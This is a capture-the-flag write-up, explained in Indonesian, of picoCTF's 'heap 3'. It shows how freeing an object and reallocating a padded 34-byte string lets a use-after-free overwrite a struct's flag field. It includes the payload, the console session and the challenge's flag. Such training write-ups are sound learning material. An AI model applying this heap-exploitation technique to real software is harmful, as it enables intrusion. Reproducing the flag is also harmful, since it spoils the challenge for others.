<h1>heap 3</h1>
<h3>Description</h3>
<p>This program mishandles memory. Can you exploit it to get the flag?
Download the binary <a href='https://artifacts.picoctf.net/c_tethys/19/chall'>here</a>.
Download the source <a href='https://artifacts.picoctf.net/c_tethys/19/chall.c'>here</a>.
Connect with the challenge instance here:
nc tethys.picoctf.net 60352</p>
<h3>Solution</h3>
<p>Pada source code terdapat type struct yang panjangnya 32 bytes, 1 char = 1 byte</p>

```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;
object *x;
```
<p>Dan, pada *x struct alokasi flag "bico", yang berarti 30 alokasi sebelumnya kosong</p>

```c
x = malloc(sizeof(object));
strncpy(x->flag, "bico", 5);
```
<p>pada server NC kita bisa clear alokasi memory terlebih dahulu sebelum digunakan kembali, pilih nomor 5</p>
<p>Lanjut pilih nomor 2 untuk alokasi string "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbb"-> 35 bytes</p>

```console
freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 5

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 35
Data for flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbb

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 3


x = bbbbb
```
<p>Hasil x->flag menjadi bbbbb, karena alokasi flag ada 5 bytes, lanjut ganti bbbbb dengan "pico"</p>

<pre>
  payload=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico
</pre>

```console
1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 2
Size of object allocation: 34
Data for flag: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice: 4
YOU WIN!!11!!
picoCTF{now_thats_free_real_estate_e8938a97}
```
<h3>Flag</h3>
<pre>
picoCTF{now_thats_free_real_estate_e8938a97}
</pre>
